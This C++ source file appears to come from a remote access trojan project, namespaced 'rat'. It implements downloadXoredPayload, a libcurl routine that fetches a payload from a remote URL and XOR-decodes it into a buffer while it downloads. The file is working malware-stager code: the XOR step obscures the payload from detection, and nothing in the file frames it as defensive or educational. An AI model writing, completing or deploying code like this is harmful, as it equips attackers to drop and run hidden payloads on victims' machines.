#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/networking.hpp"

#include <curl/curl.h>
#include <vector>

namespace rat::handler {

::rat::networking::NetworkingResult
downloadXoredPayload(::rat::networking::Client *p_Curl_Client,
                     std::vector<uint8_t> &Payload_Buffer,
                     const std::string &File_Url, std::string *p_Xor_Key) {
	::rat::networking::NetworkingResult result = {CURLE_OK, 0};

		if(File_Url.empty() || p_Xor_Key == nullptr || p_Xor_Key->empty()) {
			HANDLER_ERROR_LOG("Empty file url or key");
		}
	HANDLER_DEBUG_LOG("Before Operation Buffer size: {}",
	                  Payload_Buffer.size());
	HANDLER_DEBUG_LOG("File URL: {}", File_Url);
	::rat::networking::XorDataContext xor_data_context = {p_Xor_Key, 0,
	                                                      &Payload_Buffer};
		if((result.curl_code = p_Curl_Client->setUrl(File_Url)) != CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setWriteCallBackFunction(
		        &::rat::networking::_cbVectorXoredDataWrite)) != CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setOption(
		        CURLOPT_WRITEDATA, static_cast<void *>(&xor_data_context))) !=
		       CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setOption(CURLOPT_SSL_VERIFYPEER,
		                                                1L)) != CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setOption(CURLOPT_SSL_VERIFYHOST,
		                                                2L)) != CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setOption(CURLOPT_FOLLOWLOCATION,
		                                                1L)) != CURLE_OK ||
		   (result.curl_code =
		        p_Curl_Client->setOption(CURLOPT_TIMEOUT, 60L)) != CURLE_OK ||
		   (result.curl_code = p_Curl_Client->setOption(CURLOPT_CONNECTTIMEOUT,
		                                                5L)) != CURLE_OK) {
			HANDLER_ERROR_LOG("DownloadData setup failed: %s",
			                  curl_easy_strerror(result.curl_code));
			p_Curl_Client->reset();
			HANDLER_DEBUG_LOG("Failed at setting download Options");
			return result;
		}

	result.curl_code = p_Curl_Client->perform();
		if(result.curl_code != CURLE_OK) {
			HANDLER_ERROR_LOG("Download data failed: %s",
			                  curl_easy_strerror(result.curl_code));
			p_Curl_Client->reset();
			return result;
		}
	p_Curl_Client->reset();
	HANDLER_DEBUG_LOG("XORed Data size {}", result.size);
	return result;
}

} // namespace rat::handler
